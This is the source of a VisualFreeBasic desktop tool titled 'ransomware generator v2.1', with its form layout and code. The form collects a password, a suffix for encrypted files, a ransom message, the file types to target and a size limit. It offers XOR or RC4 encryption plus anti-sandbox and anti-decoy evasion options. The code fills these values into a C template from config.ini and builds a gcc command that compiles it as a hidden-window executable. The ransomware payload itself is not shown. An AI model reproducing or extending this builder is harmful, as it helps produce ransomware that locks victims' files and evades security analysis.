﻿#VisualFreeBasic_Form#  Version=5.6.8
Locked=0

[Form]
Name=Q
ClassStyle=CS_VREDRAW,CS_HREDRAW,CS_DBLCLKS
ClassName=WDS
WinStyle=WS_THICKFRAME,WS_CAPTION,WS_SYSMENU,WS_MINIMIZEBOX,WS_MAXIMIZEBOX,WS_CLIPSIBLINGS,WS_CLIPCHILDREN,WS_VISIBLE,WS_EX_WINDOWEDGE,WS_EX_CONTROLPARENT,WS_EX_LEFT,WS_EX_LTRREADING,WS_EX_RIGHTSCROLLBAR,WS_POPUP,WS_SIZEBOX
Style=3 - 常规窗口
Icon=
Caption=勒索病毒生成器 v2.1
StartPosition=1 - 屏幕中心
WindowState=0 - 正常
Enabled=True
Repeat=False
Left=0
Top=0
Width=598
Height=413
TopMost=False
Child=False
MdiChild=False
TitleBar=True
SizeBox=True
SysMenu=True
MaximizeBox=True
MinimizeBox=True
Help=False
Hscroll=False
Vscroll=False
MinWidth=0
MinHeight=0
MaxWidth=0
MaxHeight=0
NoActivate=False
MousePass=False
TransPer=0
TransColor=SYS,25
Shadow=0 - 无阴影
BackColor=SYS,15
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=右击查看帮助
ToolTipBalloon=False
AcceptFiles=False

[CheckBox]
Name=Set_5
Index=-1
Style=0 - 标准
Caption=反勒索诱捕
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=24
Top=73
Width=112
Height=24
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[Frame]
Name=Frame2
Index=-1
Caption=Type
TextAlign=0 - 左对齐
Fillet=5
BorderWidth=1
BorderColor=SYS,16
ForeColor=SYS,8
BackColor=SYS,25
Enabled=True
Visible=True
Font=微软雅黑,9,0
Left=157
Top=4
Width=421
Height=232
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[CheckBox]
Name=Set_3
Index=-1
Style=0 - 标准
Caption=O3优化
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
Left=24
Top=49
Width=112
Height=24
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[TextBox]
Name=gcc
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=169
Top=45
Width=403
Height=22
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=True

[TextBox]
Name=Password
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=198
Top=115
Width=84
Height=24
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[TextBox]
Name=EncryptedSuffix
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=xbck
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=353
Top=115
Width=213
Height=28
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[Label]
Name=Label1
Index=-1
Style=0 - 无边框
Caption=gcc编译器路径（gcc.exe）
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=165
Top=25
Width=154
Height=20
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[Label]
Name=Label2
Index=-1
Style=0 - 无边框
Caption=密码
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=162
Top=119
Width=28
Height=26
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[Label]
Name=Label3
Index=-1
Style=0 - 无边框
Caption=加密后缀名
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=Tahoma,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=289
Top=119
Width=99
Height=22
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[TextBox]
Name=PromptMessage
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=加密完成后的提示信息
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=True
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=True
Left=167
Top=75
Width=396
Height=37
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[Button]
Name=BeginSave
Index=-1
Caption=开始生成
TextAlign=1 - 居中
Ico=
Enabled=True
Visible=True
Default=False
OwnDraw=False
MultiLine=False
Font=宋体,24,1
Left=2
Top=296
Width=570
Height=76
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False

[TextBox]
Name=SavePath
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=生成病毒源代码的路径
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=Tahoma,12
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=9
Top=238
Width=565
Height=55
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[CheckBox]
Name=Set_2
Index=-1
Style=0 - 标准
Caption=最小体积
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=23
Top=27
Width=112
Height=24
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[Frame]
Name=Frame1
Index=-1
Caption=Setting
TextAlign=0 - 左对齐
Fillet=5
BorderWidth=1
BorderColor=SYS,16
ForeColor=SYS,8
BackColor=SYS,25
Enabled=True
Visible=True
Font=微软雅黑,9,0
Left=6
Top=2
Width=152
Height=230
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[Option]
Name=RC4
Index=-1
Style=0 - 标准
Caption=RC4
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
GroupName=OptionGroup1
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=334
Top=24
Width=76
Height=17
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[Option]
Name=Xor_
Index=-1
Style=0 - 标准
Caption=Xor
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
GroupName=OptionGroup1
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=410
Top=25
Width=94
Height=17
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[TextBox]
Name=ohzm
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=False
AutoHScroll=True
AutoVScroll=False
Left=164
Top=167
Width=404
Height=32
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[Label]
Name=hzm
Index=-1
Style=0 - 无边框
Caption=只加密下列后缀的文件
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=169
Top=145
Width=137
Height=20
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[ComboBox]
Name=Object_B
Index=-1
Style=0 - 标签和下拉框
Custom=KB|0|MB|0|<Sel>GB|0
OwnDraw=0 - 系统绘制
LabelHeight=20
ItemHeight=18
HasString=False
Sorted=True
NoHeight=False
AutoHscroll=True
MaxLength=0
Uppercase=False
Lowercase=False
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,5
Font=微软雅黑,12
Left=307
Top=202
Width=124
Height=3
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False

[Label]
Name=lx
Index=-1
Style=0 - 无边框
Caption=超过
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=167
Top=210
Width=62
Height=15
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[TextBox]
Name=length
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=
Enabled=True
Visible=True
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=True
AutoHScroll=True
AutoVScroll=False
Left=201
Top=207
Width=97
Height=23
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[Label]
Name=Label5
Index=-1
Style=0 - 无边框
Caption=时，放弃加密文件
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=447
Top=206
Width=109
Height=20
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[TextBox]
Name=TOBJ
Index=-1
Style=3 - 凹边框
TextScrollBars=0 - 无滚动条
Text=
Enabled=True
Visible=False
MaxLength=0
ForeColor=SYS,8
BackColor=SYS,5
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
PasswordChar=
Locked=False
HideSelection=True
Multiline=False
Uppercase=False
Lowercase=False
Number=True
AutoHScroll=True
AutoVScroll=False
Left=96
Top=99
Width=25
Height=19
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
LeftMargin=0
RightMargin=0
AcceptFiles=False

[Label]
Name=SSD
Index=-1
Style=0 - 无边框
Caption=跳过搜索到的前       个文件
Enabled=True
Visible=False
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=9
Top=99
Width=149
Height=22
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
ToolTip=
ToolTipBalloon=False

[Label]
Name=URL
Index=-1
Style=0 - 无边框
Caption=开源地址
Enabled=True
Visible=True
ForeColor=&HFFF58810
BackColor=SYS,25
Font=微软雅黑,9,0
TextAlign=0 - 左对齐
Prefix=True
Ellipsis=False
Left=32
Top=208
Width=99
Height=14
Layout=0 - 不锚定
MousePointer=14 - 手型
Tag=
ToolTip=
ToolTipBalloon=False

[CheckBox]
Name=Set_6
Index=-1
Style=0 - 标准
Caption=反沙箱
TextAlign=3 - 中左对齐
Alignment=0 - 文本在左边
Value=0 - 未选择
Multiline=True
Enabled=True
Visible=True
ForeColor=SYS,8
BackColor=SYS,25
Font=微软雅黑,9,0
Left=26
Top=121
Width=69
Height=12
Layout=0 - 不锚定
MousePointer=0 - 默认
Tag=
Tab=True
ToolTip=
ToolTipBalloon=False
AcceptFiles=False


[AllCode]
'优化是标准的工程模版，你也可做自己的模版。
'写好工程，复制全部文件到VFB软件文件夹里【template】里即可，子文件夹名为 VFB新建工程里显示的名称
'快去打造属于你自己的工程Sub Q_Command1_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单
dim Shared PR AS CINIFILE = "config.ini"
dim Shared CFILE1 AS STRING
dim Shared CFILE2 AS STRING
dim shared Helpmsg as string
Dim shared THEUPX AS STRING
Const buliddate as string = __Date_Iso__

#define ReadINI(Q_A, Q_B) QC(CWSTRtoString(PR.GetString(Q_A, Q_B)))
#define ZC(S) YF_Replace(S, vbCrLf, "\n")

FUNCTION QC(BYVAL Sss as string)As STRING
   Sss = YF_Replace(Sss, "$App_Path$", app.Path)
   Sss = YF_Replace(Sss, "$App_EXEName$", Time)
   Sss = YF_Replace(Sss, "$time$", Time)
   Sss = YF_Replace(Sss, "$date$", date)
   Sss = YF_Replace(Sss, "$crlf$", vbcrlf)
   Sss = YF_Replace(Sss, "$tab$", vbtab)
   Sss = YF_Replace(Sss, "$cr$", vbCr)
   Sss = YF_Replace(Sss, "$builddate$", buliddate)
   Sss = YF_Replace(Sss ,"$author$" ,"znkzz")
   Sss = YF_Replace(Sss ,"$random$" ,rdmstr)
   
   Return sss
End function
Sub Q_BeginSave_BN_Clicked(hWndForm As hWnd ,hWndControl As hWnd)  '单击
   if Len(CWSTRtoString(length.Text)) = 0 Then length.Text = "500"
    If Len(CWSTRtoString(TOBJ.Text))=0 Then TOBJ.Text="500"
   If InStr(SavePath.Text ,"""") Then

Select Case MsgBox( hWndForm,"清除原文本?", _
            MB_YESNO Or MB_ICONQUESTION Or MB_DEFBUTTON1 Or MB_APPLMODAL)
         Case IDYES
            SavePath.Text = ""
            return 
    Case IDNO
End Select
   End If
   Dim ANTI AS BOOLEAN
   if Set_5.Value = true Then 
      ANTI = true
      end if
   if len(dir(CWSTRtoString(gcc.Text))) = 0 Then
      MsgBox "Sorry,gcc not found.", 16
      q.BeginSave.Kill
   End If
   if Xor_.Value = true Then 
   open CFILE1 for input as #1
   elseif RC4.Value = true Then
    open CFILE2 for input as #1
 END IF 
 
dim _data As String
Dim buffer As String
Do While Not EOF(1)
Line Input #1, buffer
_data = _data + buffer + vbcrlf
Loop
Close #1
Dim rd_str As String =rdstr 
Dim 完整路径 As String = Environ("temp") + "\" + rd_str + ".c"
DeleteFileA 完整路径

if anti then
   _data = YF_Replace( _data ,"$ANTI$" ,"#define _ANTI_")
   _data = YF_Replace( _data ,"$count$" ,CWSTRtoString(TOBJ.TEXT))
else
   _data = YF_Replace( _data ,"$ANTI$" ,"")
   _data = YF_Replace( _data ,"$count$" ,"0")
End if
_data = YF_Replace( _data, "$ntmsg$", ZC(CWSTRtoString(PromptMessage.text)))
_data = YF_Replace( _data, "$pass_word$", ZC(CWSTRtoString(password.text)))
_data = YF_Replace( _data, "$hzm$", ZC(CWSTRtoString(EncryptedSuffix.text)))
_data = YF_Replace( _data ,"$lists$" ,CWSTRtoString(ohzm.text))
   if Set_6.Value = true Then 
      _data = YF_Replace( _data ,"$IsCPUSleep$" ,"#define CPUs")
   Else
       _data = YF_Replace( _data ,"$IsCPUSleep$" ,"")
    end if
If Object_B.ListIndex = 0 Then 
_data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"GB")
ElseIf Object_B.ListIndex = 1 Then 
_data = YF_Replace( _data ,"$length$" ,CWSTRtoString(length.text) + "*" + "KB")
ElseIf Object_B.ListIndex = 2 Then 
_data = YF_Replace( _data ,"$length$" ,CWSTRtoString(LENGTH.text)+"*"+"MB")
End If

Open 完整路径 For Output As #1
Print #1, _data
Close #1
Dim OP As String
if Set_2.Value = true Then
 OP+=" -s "
End If
if Set_3.Value = true Then
 OP+=" -O3 "
End If

SavePath.text=StringToCWSTR( CWSTRtoString(gcc.TEXT) +" -mwindows " + OP +" """+完整路径+""" -o """ + CWSTRtoString(SavePath.Text) + """" )
MsgBox "已生成gcc命令行参数!" ,48

End Sub

Sub Q_WM_RButtonDown(hWndForm As hWnd, MouseFlags As Long, xPos As Long, yPos As Long)  '按下鼠标右键
   'MouseFlags  MK_CONTROL   MK_LBUTTON     MK_MBUTTON     MK_RBUTTON    MK_SHIFT     MK_XBUTTON1       MK_XBUTTON2
   ''           CTRL键按下   鼠标左键按下   鼠标中键按下   鼠标右键按下  SHIFT键按下  第一个X按钮按下   第二个X按钮按下
   '检查什么键按下用  If (MouseFlags And MK_CONTROL)<>0 Then CTRL键按下
   MsgBox helpmsg, 48
   Select Case MsgBox(hWndForm, "打开INI文件？", _
            MB_YESNO Or MB_ICONQUESTION Or MB_DEFBUTTON2 Or MB_APPLMODAL)
      Case IDYES
         OpenFileExe "notepad.exe","CONFIG.INI"         
      Case IDNO
         RETURN
   End Select
End Sub

Sub Q_Set_2_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
   if len(dir(CWSTRtoString(gcc.Text))) = 0 Then
      MsgBox "Sorry,gcc not found.", 16
      q.set_2.Kill
   End If
End Sub

Sub Q_Set_3_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
   if len(dir(CWSTRtoString(gcc.Text))) = 0 Then
      MsgBox "Sorry,gcc not found.", 16
      q.set_3.Kill
   End If
End Sub
Function tt(DD As string, ttt as integer)as string
   if dd <> "-1" Then
      Return dd
   End If
   if dd = "-1" And ttt = 1 Then
      Q.RC4.Enabled = False
   End If
   if dd = "-1" And ttt = 2 Then
      Q.Xor_.Enabled = False
   End If
   if dd = "-1" And ttt = 4 Then
      Q.Set_2.Enabled = False
   End If
   if dd = "-1" And ttt = 5 Then
      Q.Set_3.Enabled = False
   End If
   if dd = "-1" And ttt = 7 Then
      Q.Set_5.Enabled = False
   End If
   if dd = "-1" And ttt = 8 Then
      Q.Set_6.Enabled = False
   End If
   Return "0"
End Function

Sub Q_WM_Create(hWndForm As hWnd,UserData As Integer)  '完成创建窗口及所有的控件后，此时窗口还未显示。注：自定义消息里 WM_Create 此时还未创建控件和初始赋值。
   if AfxFileLen("config.ini") = 0 Or AfxFileLen("config.ini") = 2 Then
       DeleteFileA "config.ini"
       MsgBox "Sorry,“config.ini” not found." + vbcrlf + "Please install again." ,16
      End 
   End If
   Q.Caption = ReadINI("App.Info", "Title")
   Q.gcc.Text = ReadINI("App.Info", "gcc")
   Q.Password.Text = ReadINI("App.Info", "Password")
   Q.EncryptedSuffix.Text = ReadINI("App.Info", "EncryptedSuffix")
   Q.PromptMessage.Text = ReadINI("App.Info", "PromptMessage")
   Q.ohzm.Text = """" + ReadINI("App.Info", "ohzm") + """"
   Q.SavePath.Text = ReadINI("Setting", "SavePath")
   Q.RC4.value = cint(tt(ReadINI("Setting", "RC4"), 1))
   Q.Xor_.value = cint(tt(ReadINI("Setting", "Xor"), 2))
   Q.Set_2.value = cint(tt(ReadINI("Setting", "Setting.2"), 4))
   Q.Set_3.value = cint(tt(ReadINI("Setting", "Setting.3"), 5))
   Q.Set_5.value = cint(tt(ReadINI("Setting" ,"Setting.5") ,7))
   Q.Set_6.value = cint(tt(ReadINI("Setting" ,"Setting.6") ,8))
   CFILE1 = ReadINI("Setting", "CFILE1.Path")
   CFILE2 = ReadINI("Setting", "CFILE2.Path")
   Helpmsg = ReadINI("About" ,"help")
OpenFileExe "notepad.exe","声明.txt"
End Sub

Sub Q_Set_5_BN_Clicked(hWndForm As hWnd, hWndControl As hWnd)  '单击
   if Set_5.Value = True Then
      SSD.Visible = True
      TOBJ.Visible = True  
   Else
      SSD.Visible = False
      TOBJ.Visible = false 
     End if
End Sub



Sub Q_URL_WM_LButtonDown(hWndForm As hWnd, MouseFlags As Long, xPos As Long, yPos As Long)  '按下鼠标左键
   'MouseFlags  MK_CONTROL   MK_LBUTTON     MK_MBUTTON     MK_RBUTTON    MK_SHIFT     MK_XBUTTON1       MK_XBUTTON2 
   ''           CTRL键按下   鼠标左键按下   鼠标中键按下   鼠标右键按下  SHIFT键按下  第一个X按钮按下   第二个X按钮按下
   '检查什么键按下用  If (MouseFlags And MK_CONTROL)<>0 Then CTRL键按下 
OpenWWW(NULL,"https://github.com/kaesinol/Ransomware-Maker")   
End Sub

Function rdmstr()As String
   Randomize
Return Str(Int(Rnd * 100000)+1)
End Function
Function rdstr() As String
Randomize
Dim str1 As String

For i As Integer= 3 To Int(Rnd * 15)+5
str1+=Chr(Int((122 - 97 + 1) * Rnd + 97))
Next 
Return str1
End Function


































































